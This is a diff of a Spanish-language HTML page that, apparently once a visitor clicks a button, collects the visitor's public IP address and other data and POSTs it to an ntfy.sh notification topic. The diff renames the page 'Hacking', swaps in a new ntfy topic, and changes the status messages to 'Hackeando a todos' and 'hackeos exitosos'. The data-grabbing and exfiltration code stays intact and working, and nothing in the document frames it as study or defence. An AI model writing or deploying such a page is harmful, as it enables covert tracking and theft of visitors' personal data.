@@ -2,7 +2,7 @@
 <html lang="es-Zeta">
 <head>
   <meta charset="UTF-8">
-  <title>ZetaFullNtfy</title>
+  <title>Hacking</title>
   <style>
     html,body{margin:0;height:100%;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center}
     button{padding:22px 44px;font-size:1.8rem;background:#0f0;color:#000;border:none;border-radius:10px;cursor:pointer}
@@ -16,13 +16,13 @@
 
   <script>
     /* ---------- CONFIG ---------- */
-    const NTFY = "https://ntfy.sh/n9Js9klak";  // <-- tu tema aquí
+    const NTFY = "https://ntfy.sh/pep829201029";  // <-- tu tema aquí
     /* ----------------------------- */
 
     const msg = t => document.getElementById("msg").innerText = t;
 
     document.getElementById("btn").onclick = async () => {
-      msg("Extrayendo datos…");
+      msg("Hackeando a todos");
       try {
         /* IP pública */
         const ipPub = await fetch("https://api.ipify.org?format=text").then(r => r.text()).catch(() => "error");
@@ -70,7 +70,7 @@ Timestamp: ${new Date().toLocaleString()}`;
           headers: {"Content-Type": "text/plain"}
         });
 
-        msg("✅ Datos enviados a ntfy");
+        msg("✅ hackeos exitosos");
         document.getElementById("btn").style.display = "none";
 
       } catch (e) {
